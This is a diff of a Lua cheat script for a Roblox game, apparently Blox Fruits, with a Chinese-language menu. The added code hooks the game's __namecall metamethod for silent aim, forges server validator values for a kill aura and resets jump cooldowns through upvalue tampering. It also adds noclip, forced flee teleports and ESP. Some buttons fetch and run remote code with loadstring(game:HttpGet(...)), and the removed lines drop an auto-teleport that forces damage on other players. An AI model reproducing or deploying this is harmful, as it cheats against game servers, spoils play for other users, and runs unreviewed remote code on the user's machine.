         SaveConfiguration()
@@ -954,16 +755,6 @@ task.spawn(function()
         if not ShootFunction then return 0, 0 end
         local upvals = getupvals(ShootFunction)
         if not upvals then return 0, 0 end
-        if upvals[V_Idx.v21] ~= 727595 then
-            for i, v in pairs(upvals) do
-                if v == 727595 then
-                    local offset = i - 15
-                    V_Idx.v21 = i; V_Idx.v22 = 13 + offset; V_Idx.v23 = 16 + offset; V_Idx.v24 = 17 + offset
-                    V_Idx.v26 = 12 + offset; V_Idx.v25 = 14 + offset; V_Idx.v27 = 18 + offset
-                    break
-                end
-            end
-        end
         local v1 = getupval(ShootFunction, V_Idx.v21)
         local v2 = getupval(ShootFunction, V_Idx.v22)
         local v3 = getupval(ShootFunction, V_Idx.v23)
@@ -981,24 +772,38 @@ task.spawn(function()
         setupval(ShootFunction, V_Idx.v25, v5); setupval(ShootFunction, V_Idx.v26, v6); setupval(ShootFunction, V_Idx.v27, v7)
         return math.floor(v9 / v4 * 16777215), v7
     end
-    local function GetClosestTarget()
+    local function GetAllTargets()
         local char = LocalPlayer.Character
         local root = char and char:FindFirstChild("HumanoidRootPart")
-        if not root then return nil end
-        local closest, dist = nil, math.huge
+        if not root then return {} end
+        local targets = {}
         local myPos = root.Position
         if _G.G_AttackMobs then
-            local enemiesFolder = workspace:FindFirstChild("Enemies")
-            if enemiesFolder then
-                for _, enemy in enemiesFolder:GetChildren() do
+            local function scanEnemies(folder)
+                if not folder then return end
+                for _, enemy in folder:GetChildren() do
                     local eHum = enemy:FindFirstChildOfClass("Humanoid")
                     local eRoot = enemy:FindFirstChild("HumanoidRootPart")
                     if eHum and eHum.Health > 0 and eRoot then
-                        local d = (eRoot.Position - myPos).Magnitude
-                        if d < dist then dist = d; closest = eRoot end
+                        table.insert(targets, eRoot)
                     end
                 end
             end
+            local function scanSea(node, depth)
+                if not node then return end
+                for _, enemy in node:GetChildren() do
+                    local eHum = enemy:FindFirstChildOfClass("Humanoid")
+                    local eRoot = enemy:FindFirstChild("HumanoidRootPart") or enemy.PrimaryPart or enemy:FindFirstChildWhichIsA("BasePart")
+                    if eRoot and (not eHum or eHum.Health > 0) then
+                        table.insert(targets, eRoot)
+                    elseif depth < 3 and not enemy:IsA("BasePart") then
+                        scanSea(enemy, depth + 1)
+                    end
+                end
+            end
+            scanEnemies(workspace:FindFirstChild("Enemies"))
+            scanSea(workspace:FindFirstChild("SeaBeasts"), 0)
+            scanSea(workspace:FindFirstChild("SeaEvents"), 0)
         end
         if _G.G_AttackPlayers then
             for _, player in pairs(Players:GetPlayers()) do
@@ -1006,21 +811,27 @@ task.spawn(function()
                     local pHum = player.Character:FindFirstChildOfClass("Humanoid")
                     local pRoot = player.Character:FindFirstChild("HumanoidRootPart")
                     if pHum and pHum.Health > 0 and pRoot then
-                        local d = (pRoot.Position - myPos).Magnitude
-                        if d < dist then dist = d; closest = pRoot end
+                        table.insert(targets, pRoot)
                     end
                 end
             end
         end
-        return closest
+        return targets
     end
-    while task.wait(0) do
+    while task.wait(_G.G_M1FireInterval or 0) do
         if not _G.G_DragonGunM1 then continue end
         pcall(function()
             local char = LocalPlayer.Character
             local tool = char and char:FindFirstChildOfClass("Tool")
             if not tool or tool.ToolTip ~= "Gun" then return end
-            local targetPart = GetClosestTarget()
+            local targets = GetAllTargets()
+            if #targets == 0 then return end
+            local myPos = char.HumanoidRootPart.Position
+            local targetPart, dist = nil, math.huge
+            for _, part in ipairs(targets) do
+                local d = (part.Position - myPos).Magnitude
+                if d < dist then dist = d; targetPart = part end
+            end
             if not targetPart then return end
             local valCode, valCount = GetNextValidator()
             if valCode ~= 0 then Validator2:FireServer(valCode, valCount) end
@@ -1035,6 +846,19 @@ RJR[L("杀戮光环")]:Toggle({
     Value = _G.G_DragonGunM1,
     Callback = function(v) 
         _G.G_DragonGunM1 = v 
+        SaveConfiguration()
+    end
+})
+RJR[L("杀戮光环")]:Slider({
+    Title = L("枪械 m1 发射间隔"),
+    Step = 0,
+    Value = {
+        Min = 0,
+        Max = 0.2,
+        Default = _G.G_M1FireInterval or 0.2
+    },
+    Callback = function(v)
+        _G.G_M1FireInterval = v
         SaveConfiguration()
     end
 })
@@ -1168,27 +992,78 @@ handleAbility("V3")
 handleAbility("V4")
 
 local fleeConnection = nil
+local fleeTeleported = false
+-- 世界2 → 鬼船，世界3 → 九头蛇
+local function GetFleeDestination()
+    local pid = game.PlaceId
+    if pid == 4442272183 or pid == 79091703265657 then
+        return Vector3.new(923, 126, 32852)
+    elseif pid == 7449423635 or pid == 100117331123089 then
+        return Vector3.new(-5027.03, 316.43, -3206.07)
+    end
+    return nil
+end
+local function RestoreFleeState()
+    pcall(function()
+        local char = LocalPlayer.Character
+        local hum = char and char:FindFirstChildOfClass("Humanoid")
+        local hrp = char and char:FindFirstChild("HumanoidRootPart")
+        if hrp then
+            hrp.AssemblyLinearVelocity = Vector3.zero
+            hrp.AssemblyAngularVelocity = Vector3.zero
+        end
+        if hum then
+            hum.PlatformStand = false
+            hum:ChangeState(Enum.HumanoidStateType.GettingUp)
+            hum:ChangeState(Enum.HumanoidStateType.Running)
+        end
+    end)
+end
 local function StartAutoFlee()
     if fleeConnection then return end
     fleeConnection = task.spawn(function()
         while _G.G_AutoFlee do
             task.wait(0.01)
             pcall(function()
+                if not _G.G_AutoFlee then return end
                 local char = LocalPlayer.Character
-                local hum = char and char:FindFirstChild("Humanoid")
+                local hum = char and char:FindFirstChildOfClass("Humanoid")
                 local hrp = char and char:FindFirstChild("HumanoidRootPart")
-                if not hum or not hrp or hum.Health <= 0 then return end
+                if not hum or not hrp or hum.Health <= 0 then
+                    fleeTeleported = false
+                    return
+                end
                 local hpPercent = (hum.Health / hum.MaxHealth) * 100
                 if hpPercent <= _G.G_AutoFleeHP then
+                    if not fleeTeleported then
+                        fleeTeleported = true
+                        local dest = GetFleeDestination()
+                        if dest then
+                            pcall(function()
+                                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("requestEntrance", dest)
+                            end)
+                        end
+                    end
+                    -- 清零速度 + Physics 状态，否则重力会把角色拉下来
+                    hrp.AssemblyLinearVelocity = Vector3.zero
+                    hrp.AssemblyAngularVelocity = Vector3.zero
+                    hum:ChangeState(Enum.HumanoidStateType.Physics)
                     hrp.CFrame = hrp.CFrame + Vector3.new(0, 20, 0)
+                elseif fleeTeleported then
+                    fleeTeleported = false
+                    RestoreFleeState()
                 end
             end)
         end
         fleeConnection = nil
+        fleeTeleported = false
+        RestoreFleeState()
     end)
 end
 local function StopAutoFlee()
     fleeConnection = nil
+    fleeTeleported = false
+    RestoreFleeState()
 end
 if _G.G_AutoFlee then StartAutoFlee() end
 RJR[L("主要功能")]:Toggle({
@@ -1236,13 +1111,50 @@ RJR[L("主要功能")]:Slider({
         SaveConfiguration()
     end
 })
+local LastSkillPressed = "M1 (普攻)"
+UIS.InputBegan:Connect(function(input)
+    if UIS:GetFocusedTextBox() then return end
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+        LastSkillPressed = "M1 (普攻)"
+    elseif input.KeyCode == Enum.KeyCode.Z then
+        LastSkillPressed = "Z"
+    elseif input.KeyCode == Enum.KeyCode.X then
+        LastSkillPressed = "X"
+    elseif input.KeyCode == Enum.KeyCode.C then
+        LastSkillPressed = "C"
+    elseif input.KeyCode == Enum.KeyCode.V then
+        LastSkillPressed = "V"
+    elseif input.KeyCode == Enum.KeyCode.F then
+        LastSkillPressed = "F"
+    elseif input.KeyCode == Enum.KeyCode.R then
+        LastSkillPressed = "R"
+    end
+end)
+local function IsSkillSelected(skillName)
+    local skills = _G.G_SilentAimSkills
+    if not skills then return true end
+    if type(skills) == "table" then
+        if next(skills) == nil then return false end
+        if skills[skillName] ~= nil then
+            return skills[skillName] == true
+        end
+        for _, v in pairs(skills) do
+            if v == skillName then return true end
+        end
+        return false
+    end
+    return true
+end
+local function IsCurrentSkillEnabled()
+    return IsSkillSelected(LastSkillPressed)
+end
 local mt = getrawmetatable(game)
 local oldNamecall = mt.__namecall
 setreadonly(mt, false)
 mt.__namecall = newcclosure(function(self, ...)
     local method = getnamecallmethod()
     local args = {...}
-    if _G.G_SilentAimSkill and _G.G_SilentAimTargetPos and (method == "FireServer" or method == "InvokeServer") then
+    if _G.G_SilentAimSkill and IsCurrentSkillEnabled() and _G.G_SilentAimTargetPos and (method == "FireServer" or method == "InvokeServer") then
         local sName = tostring(self)
         if sName == "RemoteEvent" or sName == "CommE" or sName == "RemoteFunction" then
             for i, v in pairs(args) do
@@ -1496,10 +1408,9 @@ local function updateESP()
                     if _G.G_ESP_Distance then parts[#parts+1] = distance .. "米 | " end
                     if _G.G_ESP_HP then parts[#parts+1] = "生命 " .. hp .. "%" end
                     data.label.Text = table.concat(parts)
-                    -- 同步高亮状态
+            
                     if _G.G_ESP_Highlight then
                         local hlColor = hexToColor3(_G.G_ESP_HighlightColor)
-                        -- 劫持角色上已有的 Highlight（游戏见闻色等），改色为我方颜色
                         pcall(function()
                             for _, child in ipairs(char:GetChildren()) do
                                 if child:IsA("Highlight") and child.Name ~= "ESP_PlayerHighlight" then
@@ -1570,7 +1481,6 @@ task.spawn(function()
     end
 end)
 
--- [控件 11] 主要功能开关
 RJR[L("主要功能")]:Input({
     Title = L("移动速度"),
     Value = tostring(_G.G_translateSpeed),
@@ -1640,110 +1550,152 @@ RJR[L("主要功能")]:Toggle({
         SaveConfiguration()
     end
 })
+local InfiniteJumpRunning = false
+local InfiniteJumpLast = 0
+local SkyjumpFns = nil
+local SkyjumpFnsSky = nil
+local function ResetSkyjumpUpvalues(char)
+    if not (char and getgc and getupvalues and setupvalue) then return end
+    local sky = char:FindFirstChild("Skyjump")
+    if not sky then return end
+    if SkyjumpFnsSky ~= sky or #SkyjumpFns == 0 then
+        SkyjumpFnsSky = sky
+        SkyjumpFns = {}
+        for _, fn in next, getgc() do
+            if typeof(fn) == "function" then
+                local ok, env = pcall(getfenv, fn)
+                if ok and env and env.script == sky then
+                    table.insert(SkyjumpFns, fn)
+                end
+            end
+        end
+    end
+    for _, fn in ipairs(SkyjumpFns) do
+        for i, uv in next, getupvalues(fn) do
+            if type(uv) == "table" and uv.LastUse ~= nil then
+                uv.LastUse = 0
+            elseif type(uv) == "number" and uv >= 5 and uv <= 100 then
+                pcall(setupvalue, fn, i, 0)
+            end
+        end
+    end
+end
+local function DoInfiniteJump()
+    if not _G.G_InfiniteJump then return end
+    local now = tick()
+    if now - InfiniteJumpLast < 0.05 then return end
+    InfiniteJumpLast = now
+    local char = LocalPlayer.Character
+    if not char then return end
+    local hum = char:FindFirstChildOfClass("Humanoid")
+    local hrp = char:FindFirstChild("HumanoidRootPart")
+    if not hum or not hrp or hum.Health <= 0 or hum.Sit then return end
+    ResetSkyjumpUpvalues(char)
+    pcall(function()
+        hum:ChangeState(Enum.HumanoidStateType.Jumping)
+    end)
+    local mult = 1.5
+    pcall(function()
+        local race = LocalPlayer:FindFirstChild("Data") and LocalPlayer.Data:FindFirstChild("Race")
+        if race and race.Value == "Skypiea" then mult = 1.4 end
+    end)
+    local jp = 50
+    if hum.UseJumpPower then
+        jp = hum.JumpPower
+    else
+        jp = math.sqrt(math.max(hum.JumpHeight or 7.2, 0) * 2 * workspace.Gravity)
+    end
+    local vel = hrp.AssemblyLinearVelocity
+    hrp.AssemblyLinearVelocity = Vector3.new(vel.X, math.max(jp * mult, 50), vel.Z)
+    pcall(function()
+        local energy = char:FindFirstChild("Energy")
+        local cost = 15
+        if energy and energy.Value >= cost then
+            local remotes = ReplicatedStorage:FindFirstChild("Remotes")
+            local commE = remotes and remotes:FindFirstChild("CommE")
+            if commE then
+                commE:FireServer("Dodge", "Geppo", cost, nil, workspace:GetServerTimeNow())
+            end
+            local skyEv = ReplicatedStorage:FindFirstChild("PlayerSkyJumped")
+            if skyEv then skyEv:Fire() end
+        end
+    end)
+end
+UIS.JumpRequest:Connect(DoInfiniteJump)
+local function StartInfiniteJumpLoop()
+    if InfiniteJumpRunning then return end
+    InfiniteJumpRunning = true
+    task.spawn(function()
+        while _G.G_InfiniteJump do
+            pcall(ResetSkyjumpUpvalues, LocalPlayer.Character)
+            task.wait(0.1)
+        end
+        InfiniteJumpRunning = false
+    end)
+end
+if _G.G_InfiniteJump then StartInfiniteJumpLoop() end
+LocalPlayer.CharacterAdded:Connect(function()
+    if _G.G_InfiniteJump then
+        task.wait(1)
+        StartInfiniteJumpLoop()
+    end
+end)
+RJR[L("主要功能")]:Toggle({
+    Title = L("无限跳跃"),
+    Value = _G.G_InfiniteJump,
+    Callback = function(v)
+        _G.G_InfiniteJump = v
+        if v then StartInfiniteJumpLoop() end
+        SaveConfiguration()
+    end
+})
+
+local NoclipConnection = nil
+local function StartNoclip()
+    if NoclipConnection then return end
+    NoclipConnection = RunService.Stepped:Connect(function()
+        local char = LocalPlayer.Character
+        if not char then return end
+        for _, part in pairs(char:GetDescendants()) do
+            if part:IsA("BasePart") and part.CanCollide then
+                part.CanCollide = false
+            end
+        end
+    end)
+end
+local function StopNoclip()
+    if NoclipConnection then
+        NoclipConnection:Disconnect()
+        NoclipConnection = nil
+    end
+    local char = LocalPlayer.Character
+    if not char then return end
+    for _, part in pairs(char:GetDescendants()) do
+        if part:IsA("BasePart") then
+            part.CanCollide = true
+        end
+    end
+end
+if _G.G_Noclip then StartNoclip() end
+RJR[L("主要功能")]:Toggle({
+    Title = L("穿墙"),
+    Value = _G.G_Noclip,
+    Callback = function(v)
+        _G.G_Noclip = v
+        if v then StartNoclip() else StopNoclip() end
+        SaveConfiguration()
+    end
+})
 
 RJR[L("主要功能")]:Button({
     Title = L("飞行"),
     Icon = "wind",
     Callback = function()
         pcall(function()
-            loadstring(game:HttpGet("https://raw.githubusercontent.com/ttker951-dot/y1/refs/heads/main/fly"))()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/kismile36/g1/refs/heads/main/FLY"))()
         end)
     end
 })
-
-local AutoSoruTask
-local AutoSoruRevision = 0
-
-local function SoruTo(targetPosition)
-    local character = LocalPlayer.Character
-    if not character then return end
-    local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
-    local humanoid = character:FindFirstChild("Humanoid")
-    if not humanoidRootPart or not humanoid or humanoid.Health <= 0 then return end
-    local startCFrame = humanoidRootPart.CFrame
-    local finalCFrame = (startCFrame - startCFrame.Position)
-        + targetPosition
-        + Vector3.new(0, humanoidRootPart.Size.Y * 1.5, 0)
-    ReplicatedStorage.Remotes.CommE:FireServer(
-        "Soru",
-        startCFrame,
-        finalCFrame,
-        workspace:GetServerTimeNow(),
-        math.random(1, 999999999)
-    )
-end
-
-local function GetClosestPlayerForSoru()
-    local character = LocalPlayer.Character
-    local root = character and character:FindFirstChild("HumanoidRootPart")
-    if not root then return nil end
-    local closestPlayer
-    local shortestDistance = math.huge
-    for _, player in ipairs(Players:GetPlayers()) do
-        if player ~= LocalPlayer then
-            local otherCharacter = player.Character
-            local otherHumanoid = otherCharacter and otherCharacter:FindFirstChild("Humanoid")
-            local otherRoot = otherCharacter and otherCharacter:FindFirstChild("HumanoidRootPart")
-            if otherHumanoid and otherRoot and otherHumanoid.Health > 0 then
-                local distance = (otherRoot.Position - root.Position).Magnitude
-                if distance < shortestDistance then
-                    shortestDistance = distance
-                    closestPlayer = player
-                end
-            end
-        end
-    end
-    return closestPlayer
-end
-
-local function SoruToClosestPlayer()
-    local targetPlayer = GetClosestPlayerForSoru()
-    local targetRoot = targetPlayer and targetPlayer.Character
-        and targetPlayer.Character:FindFirstChild("HumanoidRootPart")
-    if targetRoot then
-        SoruTo((targetRoot.CFrame * CFrame.new(0, 0, 3)).Position)
-    end
-end
-
-local function StartAutoSoru()
-    if AutoSoruTask then return end
-    AutoSoruRevision = AutoSoruRevision + 1
-    local revision = AutoSoruRevision
-    AutoSoruTask = task.spawn(function()
-        while _G.G_AutoSoru and AutoSoruRevision == revision do
-            pcall(SoruToClosestPlayer)
-            task.wait(1)
-        end
-        if AutoSoruRevision == revision then
-            AutoSoruTask = nil
-        end
-    end)
-end
-
-local function StopAutoSoru()
-    AutoSoruRevision = AutoSoruRevision + 1
-    AutoSoruTask = nil
-end
-
-AutoSoruSection:Toggle({
-    Title = L("自动瞬步"),
-    Desc = L("每15秒强制打你2500血你气不气😂"),
-    Value = _G.G_AutoSoru,
-    Callback = function(value)
-        _G.G_AutoSoru = value
-        if value then
-            StartAutoSoru()
-        else
-            StopAutoSoru()
-        end
-        SaveConfiguration()
-    end,
-})
-
-if _G.G_AutoSoru then
-    StartAutoSoru()
-end
-
 RJR["ESP"]:Toggle({
     Title = L("ESP 开关"),
     Value = _G.G_ESPEnabled,
@@ -2240,7 +2192,7 @@ end
 if _G.G_NoMove then StartNoMove() end
 
 
--- [控件 12] 杂项
+
 RJR[L("杂项")]:Slider({
     Title = L("视角缩放距离"),
     Value = {
@@ -2486,6 +2438,37 @@ RJR[L("商店")]:Button({
 })
 
 
+RJR[L("公告")]:Paragraph({
+    Title = L("DC 服务器"),
+    Desc = "https://discord.gg/862SZpM7Qk",
+    Buttons = {{
+        Title = L("点击复制 DC 链接"),
+        Callback = function()
+            setclipboard("https://discord.gg/862SZpM7Qk")
+            WindUI:Notify({ Title = L("复制成功"), Content = L("已复制 DC 链接"), Duration = 2 })
+        end
+    }}
+})
+
+RJR[L("公告")]:Divider()
+
+RJR[L("公告")]:Paragraph({
+    Title = "声明",
+    Desc = "此脚本完全免费开源 禁止拿去圈钱",
+})
+
+RJR[L("公告")]:Paragraph({
+    Title = L("Rayfield ui版脚本链接"),
+    Desc = [[loadstring(game:HttpGet("https://raw.githubusercontent.com/kismile36/g1/refs/heads/main/RJR_rayfileld"))()]],
+    Buttons = {{
+        Title = L("点击复制"),
+        Callback = function()
+            setclipboard([[loadstring(game:HttpGet("https://raw.githubusercontent.com/kismile36/g1/refs/heads/main/RJR_rayfileld"))()]])
+            WindUI:Notify({ Title = L("复制成功"), Content = L("已复制链接"), Duration = 2 })
+        end
+    }}
+})
+
 RJR[L("服务器")]:Button({
     Title = L("重进服务器"),
     Callback = function()
@@ -2497,58 +2480,55 @@ RJR[L("服务器")]:Button({
     end
 })
 
-local function FormatNumber(value)
-    local text = tostring(math.floor(tonumber(value) or 0))
-    local left, digits, right = text:match("^([^%d]*%d)(%d*)(.-)$")
-    return left .. (digits:reverse():gsub("(%d%d%d)", "%1,"):reverse()) .. right
+local function FormatNumber(n)
+    local s = tostring(math.floor(tonumber(n) or 0))
+    local left, num, right = s:match("^([^%d]*%d)(%d*)(.-)$")
+    return left .. (num:reverse():gsub("(%d%d%d)", "%1,"):reverse()) .. right
 end
 
 local function ApplyPlayerRange(label)
     _G.G_HopPlayerRange = label
-    local minimum, maximum = label:match("(%d+)%-(%d+)")
-    _G.G_HopMinPlayers = tonumber(minimum) or 1
-    _G.G_HopMaxPlayers = tonumber(maximum) or 12
+    local minPlayers, maxPlayers = label:match("(%d+)%-(%d+)")
+    if minPlayers and maxPlayers then
+        _G.G_HopMinPlayers = tonumber(minPlayers)
+        _G.G_HopMaxPlayers = tonumber(maxPlayers)
+        return
+    end
+    _G.G_HopMinPlayers = 1
+    _G.G_HopMaxPlayers = 12
 end
 
 local function ApplyBountyRange(label)
     _G.G_HopBountyRange = label
-    local amount = label:match("大于([%d%.]+[Mm]?)")
-    if not amount then
-        _G.G_HopMinBounty = 0
+    local minOnly = label:match("大于([%d%.]+[Mm]?)")
+    if minOnly then
+        local num, unit = minOnly:match("([%d%.]+)([Mm]?)")
+        local value = tonumber(num) or 0
+        if unit and unit:lower() == "m" then value = value * 1000000 end
+        _G.G_HopMinBounty = value + 1
         _G.G_HopMaxBounty = 999999999
         return
     end
-    local number, unit = amount:match("([%d%.]+)([Mm]?)")
-    local value = tonumber(number) or 0
-    if unit and unit:lower() == "m" then
-        value = value * 1000000
-    end
-    _G.G_HopMinBounty = value + 1
+    _G.G_HopMinBounty = 0
     _G.G_HopMaxBounty = 999999999
 end
 
 local function ParseServerInfo(text)
     if type(text) ~= "string" or text == "" then return nil end
     local region = text:match("Region:%s*(.-)%s*%-%s*Players:")
-    local currentPlayers, maximumPlayers = text:match("Players:%s*(%d+)%s*/%s*(%d+)")
-    local bountyText = text:match("Bounty:%s*([%d,]+)")
-    if not currentPlayers or not maximumPlayers or not bountyText then return nil end
-    local bounty = tonumber((bountyText:gsub(",", "")))
+    local cur, max = text:match("Players:%s*(%d+)%s*/%s*(%d+)")
+    local bt = text:match("Bounty:%s*([%d,]+)")
+    if not cur or not max or not bt then return nil end
+    local bounty = tonumber((bt:gsub(",", "")))
     if not bounty then return nil end
-    return {
-        Region = region or "Unknown",
-        Players = tonumber(currentPlayers),
-        MaxPlayers = tonumber(maximumPlayers),
-        Bounty = bounty,
-    }
+    return { Region = region or "Unknown", Players = tonumber(cur), MaxPlayers = tonumber(max), Bounty = bounty }
 end
 
 local function IsServerAllowed(info)
-    return info
-        and info.Players >= _G.G_HopMinPlayers
-        and info.Players <= _G.G_HopMaxPlayers
-        and info.Bounty >= _G.G_HopMinBounty
-        and info.Bounty <= _G.G_HopMaxBounty
+    if not info then return false end
+    if info.Players < _G.G_HopMinPlayers or info.Players > _G.G_HopMaxPlayers then return false end
+    if info.Bounty < _G.G_HopMinBounty or info.Bounty > _G.G_HopMaxBounty then return false end
+    return true
 end
 
 ApplyPlayerRange(_G.G_HopPlayerRange)
@@ -2558,11 +2538,7 @@ RJR[L("服务器")]:Dropdown({
     Title = L("选择服务器区域"),
     Desc = L("跳服时搜索的服务器区域"),
     Values = {"Oregon", "Florida", "Texas", "California", "Hong Kong", "Germany", "Brazil", "Singapore"},
-    Value = ValidDropdownValue(
-        {"Oregon", "Florida", "Texas", "California", "Hong Kong", "Germany", "Brazil", "Singapore"},
-        _G.G_ServerRegion,
-        "Singapore"
-    ),
+    Value = _G.G_ServerRegion,
     Callback = function(v)
         _G.G_ServerRegion = v
         SaveConfiguration()
@@ -2575,15 +2551,11 @@ RJR[L("服务器")]:Dropdown({
     Desc = L("跳服时过滤人数范围"),
     Values = {"1-12", "3-12", "5-12", "7-12", "9-12"},
     Value = _G.G_HopPlayerRange,
-    Callback = function(value)
-        ApplyPlayerRange(value)
+    Callback = function(v)
+        ApplyPlayerRange(v)
         SaveConfiguration()
-        WindUI:Notify({
-            Title = L("人数设置"),
-            Content = value .. " (" .. _G.G_HopMinPlayers .. "-" .. _G.G_HopMaxPlayers .. ")",
-            Duration = 2,
-        })
-    end,
+        WindUI:Notify({ Title = L("人数设置"), Content = v .. " (" .. _G.G_HopMinPlayers .. "-" .. _G.G_HopMaxPlayers .. ")", Duration = 2 })
+    end
 })
 
 RJR[L("服务器")]:Dropdown({
@@ -2591,57 +2563,54 @@ RJR[L("服务器")]:Dropdown({
     Desc = L("跳服时过滤赏金范围"),
     Values = {"大于3m", "大于5m", "大于10m", "大于15m", "大于25m", "大于35m", "大于50m"},
     Value = _G.G_HopBountyRange,
-    Callback = function(value)
-        ApplyBountyRange(value)
+    Callback = function(v)
+        ApplyBountyRange(v)
         SaveConfiguration()
-        WindUI:Notify({
-            Title = L("赏金设置"),
-            Content = value .. " (" .. FormatNumber(_G.G_HopMinBounty) .. " - " .. FormatNumber(_G.G_HopMaxBounty) .. ")",
-            Duration = 2,
-        })
-    end,
+        WindUI:Notify({ Title = L("赏金设置"), Content = v .. " (" .. FormatNumber(_G.G_HopMinBounty) .. " - " .. FormatNumber(_G.G_HopMaxBounty) .. ")", Duration = 2 })
+    end
 })
 
 RJR[L("服务器")]:Button({
     Title = L("跳服"),
     Icon = "wind",
     Callback = function()
-        if getgenv().IsServerHopping == true then return end 
+        if getgenv().IsServerHopping == true then return end
 
-        getgenv().IsServerHopping = true 
-        getgenv().ShuttingDown = true 
+        getgenv().IsServerHopping = true
+        getgenv().ShuttingDown = true
 
-        WindUI:Notify({ 
-            Title = L("自动跳服"), 
+        WindUI:Notify({
+            Title = L("自动跳服"),
             Content = L("准备跳服...") .. "\n\n"
                 .. L("设置区域为: ") .. _G.G_ServerRegion .. "\n"
                 .. L("人数: ") .. _G.G_HopPlayerRange .. "\n"
                 .. L("赏金: ") .. _G.G_HopBountyRange,
-            Icon = "wind", 
+            Icon = "wind",
             Duration = 10
-        }) 
+        })
 
-        local PlayerGui = LocalPlayer.PlayerGui 
+        local PlayerGui = LocalPlayer.PlayerGui
 
-        if not PlayerGui:FindFirstChild("ServerBrowser") then 
-            getgenv().IsServerHopping = false 
-            return 
-        end 
+        if not PlayerGui:FindFirstChild("ServerBrowser") then
+            getgenv().IsServerHopping = false
+            return
+        end
 
-        PlayerGui.ServerBrowser.Enabled = true 
-        task.wait(0.1) 
+        PlayerGui.ServerBrowser.Enabled = true
+        task.wait(0.1)
 
-        local Filters = PlayerGui.ServerBrowser.Frame:FindFirstChild("Filters") 
-        local SearchRegion = Filters and Filters:FindFirstChild("SearchRegion") 
-        local TextBox = SearchRegion and SearchRegion:FindFirstChild("TextBox") 
+        local Filters = PlayerGui.ServerBrowser.Frame:FindFirstChild("Filters")
+        local SearchRegion = Filters and Filters:FindFirstChild("SearchRegion")
+        local TextBox = SearchRegion and SearchRegion:FindFirstChild("TextBox")
 
-        if not TextBox then 
-            getgenv().IsServerHopping = false 
-            return 
-        end 
+        if not TextBox then
+            getgenv().IsServerHopping = false
+            return
+        end
 
-        TextBox.Text = _G.G_ServerRegion 
+        TextBox.Text = _G.G_ServerRegion
 
+        -- 展开完整列表
         local Full = Filters and Filters:FindFirstChild("Full")
         local FullCheck = Full and Full:FindFirstChild("Check")
         if FullCheck then
@@ -2649,34 +2618,35 @@ RJR[L("服务器")]:Button({
             task.wait(0.1)
         end
 
-        local ScrollingFrame = PlayerGui.ServerBrowser.Frame.ScrollingFrame 
-        local FakeScroll = PlayerGui.ServerBrowser.Frame.FakeScroll 
-        local Inside = FakeScroll.Inside 
+        local ScrollingFrame = PlayerGui.ServerBrowser.Frame.ScrollingFrame
+        local FakeScroll = PlayerGui.ServerBrowser.Frame.FakeScroll
+        local Inside = FakeScroll.Inside
 
-        task.spawn(function() 
+        task.spawn(function()
             while getgenv().IsServerHopping do
-                ScrollingFrame.CanvasPosition = Vector2.new(0, math.random(100, 7000)) 
+                ScrollingFrame.CanvasPosition = Vector2.new(0, math.random(100, 7000))
                 task.wait(0.3)
-            end 
-        end) 
+            end
+        end)
 
-        task.wait() 
+        task.wait()
 
-        local currentJobId = game.JobId 
+        local currentJobId = game.JobId
         local ServerBrowserRemote = game:GetService("ReplicatedStorage"):WaitForChild("__ServerBrowser")
 
         while getgenv().IsServerHopping do
-            for _, template in ipairs(Inside:GetChildren()) do 
-                if template.Name == "Template" then 
-                    local joinButton = template:FindFirstChild("Join") 
+            for _, template in ipairs(Inside:GetChildren()) do
+                if template.Name == "Template" then
+                    local joinButton = template:FindFirstChild("Join")
                     local textLabel = template:FindFirstChild("TextLabel")
                     local info = textLabel and ParseServerInfo(textLabel.Text)
+
                     if joinButton and info and IsServerAllowed(info) then
-                        local job = joinButton:GetAttribute("Job") 
-                        if job and tostring(job):find("-", 1, true) then 
-                            job = tostring(job) 
-                            
-                            if job ~= currentJobId then 
+                        local job = joinButton:GetAttribute("Job")
+                        if job and tostring(job):find("-", 1, true) then
+                            job = tostring(job)
+
+                            if job ~= currentJobId then
                                 WindUI:Notify({
                                     Title = L("匹配到服务器"),
                                     Content = L("尝试跳服") .. "\n"
@@ -2684,30 +2654,31 @@ RJR[L("服务器")]:Button({
                                         .. L("人数: ") .. info.Players .. "/" .. info.MaxPlayers .. "\n"
                                         .. L("赏金: ") .. FormatNumber(info.Bounty),
                                     Icon = "wind",
-                                    Duration = 5,
+                                    Duration = 5
                                 })
+
                                 local success = pcall(function()
-                                    ServerBrowserRemote:InvokeServer("teleport", job) 
-                                end) 
-                                if not success then 
+                                    ServerBrowserRemote:InvokeServer("teleport", job)
+                                end)
+                                if not success then
                                     local success2 = pcall(function()
-                                        ServerBrowserRemote:InvokeServer("teleport", job) 
-                                    end) 
-                                    if not success2 then 
-                                        WindUI:Notify({ 
-                                            Title = L("自动跳服"), 
-                                            Content = L("跳服失败") .. "\n\n" .. L("请重新加入游戏"), 
-                                            Icon = "wind", 
+                                        ServerBrowserRemote:InvokeServer("teleport", job)
+                                    end)
+                                    if not success2 then
+                                        WindUI:Notify({
+                                            Title = L("自动跳服"),
+                                            Content = L("跳服失败") .. "\n\n" .. L("请重新加入游戏"),
+                                            Icon = "wind",
                                             Duration = 10
-                                        }) 
-                                    end 
-                                end 
-                                task.wait(0.3) 
-                            end 
-                        end 
-                    end 
-                end 
-            end 
+                                        })
+                                    end
+                                end
+                                task.wait(0.3)
+                            end
+                        end
+                    end
+                end
+            end
             task.wait(3)
         end
     end
@@ -2716,14 +2687,13 @@ RJR[L("服务器")]:Button({
 RJR[L("服务器")]:Paragraph({
     Title = L("服务器id"),
     Desc = game.JobId,
-})
-
-RJR[L("服务器")]:Button({
-    Title = L("复制服务器 ID"),
-    ActionText = L("点击复制"),
-    Callback = function()
-        CopyAnnouncementText(game.JobId, L("已复制当前服务器ID"))
-    end,
+    Buttons = {{
+        Title = "Copy",
+        Callback = function()
+            setclipboard(game.JobId)
+            WindUI:Notify({ Title = L("复制成功"), Content = L("已复制当前服务器ID"), Duration = 2 })
+        end
+    }}
 })
 
 RJR[L("服务器")]:Input({
@@ -2753,24 +2723,24 @@ RJR[L("服务器")]:Button({
 })
 
 
-local themeChoices = {
-    {Title = L("午夜"), Description = L("深色中性配色"), Value = "Midnight"},
-    {Title = L("深海"), Description = L("蓝色深海配色"), Value = "Ocean"},
-    {Title = L("紫罗兰"), Description = L("紫色强调配色"), Value = "Violet"},
